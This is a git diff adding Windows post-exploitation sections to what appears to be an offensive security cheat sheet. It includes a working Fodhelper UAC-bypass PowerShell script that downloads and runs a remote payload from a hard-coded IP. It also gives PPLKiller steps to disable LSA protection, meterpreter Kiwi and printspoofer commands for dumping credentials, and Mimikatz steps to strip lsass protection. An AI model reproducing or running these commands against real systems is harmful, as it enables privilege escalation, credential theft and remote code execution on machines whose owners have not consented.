@@ -67,6 +67,8 @@ Enjoy creating your own 🦠
 # [Windows](#Windows-1)
 - [Paths](#check-writable-paths-under-cwindows)
 - [Data Stream Execution](#alternate_data_stream_execution)
+- [Fodhelper-UACBYPASS](#Fodhelper)
+- [PPLKiller.exe(#PPLKiller)
 - [Mimikatz](#Mimikatz)
 - [Windows_Privilege_Escalation](#windows_privilege_escalation)
 - [Windows_Download_Execute](#Windows_Download_Execute)
@@ -1245,7 +1247,8 @@ bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local
 
 # Windows
 
-### Check writable paths under C:\Windows
+### Writeable_paths
+
 ```powershell
 accesschk.exe "currentuser" C:\Windows -wus
 ```
@@ -1262,9 +1265,59 @@ accesschk.exe "currentuser" C:\Windows -wus
 <br>
 <br>
 
+### Fodhelper
+
+```powershell
+1. Copy the code below and edit for your payload/create powershell script
+2. Execute 'iex(new-object net.webclient).downloadstring('http://172.21.23.10/CodeBelow.ps1')
+3. Might need to run twice and then execute the function 'Bypassuac'
+4. Check Listener and verify 'whoami /groups'. Your looking for 'High mandatory level'
+
+```powershell
+function tryme { 
+    $cmd = "powershell.exe iex(new-object net.webclient).downloadstring('http://172.21.23.10/metrunner.ps1')"
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue 
+    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force 
+    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force 
+    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
+} 
+function Bypassuac { 
+    Start-Process "C:\Windows\System32\fodhelper.exe" -windowstyle hidden
+    Start-Sleep -s 5
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue 
+} 
+tryme
+```
+
+<br>
+<br>
+
+### PPLKiller
+
+```powershell
+1. upload the driver RTCore64.sys
+2. upload PPLKiller.exe
+3. PPLKiller.exe /installDriver
+4. PPLKiller.exe /disableLSAProtection
+*This is not work on a medium mandatory level ref to fodhelper section to obtain a high level. Verify this by 'whoami /groups'
+```
+<br>
+<br>
+
 # Mimikatz
 
+
+### Metasploit Kiwi
+
+```powershell
+1. While in meterpreter 'load kiwi'
+2. creds_all
+*Need system priv, Can be done using 'printspoofer.exe -i -c powershell.exe'....impersonate has to be enabled.
+```
+
+
 ### Disable_LSA_and_Dump
+
 ```powershell
 1. +!
 2. !processprotect /process:lsass.exe /remove
